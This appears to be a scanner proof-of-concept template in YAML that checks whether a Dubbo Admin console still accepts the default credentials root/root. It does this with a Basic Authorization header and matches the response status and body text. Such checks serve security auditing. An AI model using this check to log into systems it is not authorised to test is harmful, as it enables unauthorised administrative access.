name: poc-yaml-dubbo-admin-default-password
description: "dubbo默认账号密码:root/root"
method: GET
headers:
  Authorization: "Basic cm9vdDpyb290"
path:
  - /
expression:
  status: 200
  body_all:
    - "Dubbo Admin"
    - "root"